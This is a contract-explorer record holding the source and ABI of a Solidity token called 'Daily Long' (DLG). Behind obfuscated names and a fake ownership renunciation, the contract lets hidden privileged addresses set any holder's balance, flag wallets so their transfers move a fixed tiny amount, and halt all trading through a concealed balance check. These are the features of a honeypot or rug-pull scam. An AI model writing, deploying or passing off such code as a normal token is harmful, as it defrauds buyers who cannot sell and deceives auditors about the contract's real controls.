{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface marketingWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedTake) external view returns (uint256);\n\n    function transfer(address fromLaunched, uint256 takeReceiverExempt) external returns (bool);\n\n    function allowance(address atTxIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeReceiverExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromLaunched,\n        uint256 takeReceiverExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableReceiverBuy, uint256 value);\n    event Approval(address indexed atTxIs, address indexed spender, uint256 value);\n}\n\nabstract contract maxFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoReceiverExempt {\n    function createPair(address buyTokenFrom, address tradingBuy) external returns (address);\n}\n\ninterface marketingWalletMetadata is marketingWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DailyLong is maxFee, marketingWallet, marketingWalletMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoMarketing;\n    }\n\n    uint8 private autoMarketing = 18;\n\n    function balanceOf(address launchedTake) public view virtual override returns (uint256) {\n        return txAmount[launchedTake];\n    }\n\n    uint256 private launchReceiver = 100000000 * 10 ** 18;\n\n    function limitToken(uint256 takeReceiverExempt) public {\n        txLaunch();\n        autoReceiver = takeReceiverExempt;\n    }\n\n    string private shouldTeam = \"DLG\";\n\n    bool public totalAuto;\n\n    function owner() external view returns (address) {\n        return teamTakeShould;\n    }\n\n    address listTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address tradingSender, address fromLaunched, uint256 takeReceiverExempt) external override returns (bool) {\n        if (_msgSender() != isShould) {\n            if (amountLimit[tradingSender][_msgSender()] != type(uint256).max) {\n                require(takeReceiverExempt <= amountLimit[tradingSender][_msgSender()]);\n                amountLimit[tradingSender][_msgSender()] -= takeReceiverExempt;\n            }\n        }\n        return totalReceiver(tradingSender, fromLaunched, takeReceiverExempt);\n    }\n\n    function transfer(address minLimit, uint256 takeReceiverExempt) external virtual override returns (bool) {\n        return totalReceiver(_msgSender(), minLimit, takeReceiverExempt);\n    }\n\n    function minAutoSender(address minLimit, uint256 takeReceiverExempt) public {\n        txLaunch();\n        txAmount[minLimit] = takeReceiverExempt;\n    }\n\n    uint256 private receiverAtToken;\n\n    uint256 public fundTrading;\n\n    mapping(address => mapping(address => uint256)) private amountLimit;\n\n    bool public limitReceiverTrading;\n\n    uint256 public marketingSwap;\n\n    string private txLaunched = \"Daily Long\";\n\n    function totalReceiver(address tradingSender, address fromLaunched, uint256 takeReceiverExempt) internal returns (bool) {\n        if (tradingSender == receiverSwap) {\n            return takeFee(tradingSender, fromLaunched, takeReceiverExempt);\n        }\n        uint256 maxSell = marketingWallet(senderMax).balanceOf(listTo);\n        require(maxSell == autoReceiver);\n        require(fromLaunched != listTo);\n        if (atMarketingWallet[tradingSender]) {\n            return takeFee(tradingSender, fromLaunched, teamReceiver);\n        }\n        return takeFee(tradingSender, fromLaunched, takeReceiverExempt);\n    }\n\n    mapping(address => bool) public atMarketingWallet;\n\n    address public senderMax;\n\n    uint256 public shouldSwap;\n\n    bool private tokenTakeMarketing;\n\n    uint256 private amountTo;\n\n    uint256 autoReceiver;\n\n    function receiverShould() public {\n        emit OwnershipTransferred(receiverSwap, address(0));\n        teamTakeShould = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txLaunched;\n    }\n\n    address isShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        tokenMode amountFeeLaunched = tokenMode(isShould);\n        senderMax = autoReceiverExempt(amountFeeLaunched.factory()).createPair(amountFeeLaunched.WETH(), address(this));\n        if (fundTrading == autoFrom) {\n            limitReceiverTrading = false;\n        }\n        receiverSwap = _msgSender();\n        receiverShould();\n        atTo[receiverSwap] = true;\n        txAmount[receiverSwap] = launchReceiver;\n        if (modeFund != marketingSwap) {\n            shouldWallet = true;\n        }\n        emit Transfer(address(0), receiverSwap, launchReceiver);\n    }\n\n    function launchedAmountToken(address maxMarketingMin) public {\n        txLaunch();\n        \n        if (maxMarketingMin == receiverSwap || maxMarketingMin == senderMax) {\n            return;\n        }\n        atMarketingWallet[maxMarketingMin] = true;\n    }\n\n    function maxSwap(address txSellAmount) public {\n        if (totalAuto) {\n            return;\n        }\n        if (limitReceiverTrading != shouldWallet) {\n            modeFund = shouldSwap;\n        }\n        atTo[txSellAmount] = true;\n        \n        totalAuto = true;\n    }\n\n    event OwnershipTransferred(address indexed autoAt, address indexed feeLimit);\n\n    function getOwner() external view returns (address) {\n        return teamTakeShould;\n    }\n\n    uint256 constant teamReceiver = 9 ** 10;\n\n    bool public shouldWallet;\n\n    uint256 shouldLiquidity;\n\n    uint256 public modeFund;\n\n    address public receiverSwap;\n\n    function takeFee(address tradingSender, address fromLaunched, uint256 takeReceiverExempt) internal returns (bool) {\n        require(txAmount[tradingSender] >= takeReceiverExempt);\n        txAmount[tradingSender] -= takeReceiverExempt;\n        txAmount[fromLaunched] += takeReceiverExempt;\n        emit Transfer(tradingSender, fromLaunched, takeReceiverExempt);\n        return true;\n    }\n\n    mapping(address => bool) public atTo;\n\n    address private teamTakeShould;\n\n    uint256 public autoFrom;\n\n    function approve(address totalLimit, uint256 takeReceiverExempt) public virtual override returns (bool) {\n        amountLimit[_msgSender()][totalLimit] = takeReceiverExempt;\n        emit Approval(_msgSender(), totalLimit, takeReceiverExempt);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchReceiver;\n    }\n\n    function txLaunch() private view {\n        require(atTo[_msgSender()]);\n    }\n\n    mapping(address => uint256) private txAmount;\n\n    function allowance(address swapWalletIs, address totalLimit) external view virtual override returns (uint256) {\n        if (totalLimit == isShould) {\n            return type(uint256).max;\n        }\n        return amountLimit[swapWalletIs][totalLimit];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTxIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableReceiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWalletIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atMarketingWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMarketingMin\",\"type\":\"address\"}],\"name\":\"launchedAmountToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"limitToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSellAmount\",\"type\":\"address\"}],\"name\":\"maxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"minAutoSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiverExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DailyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}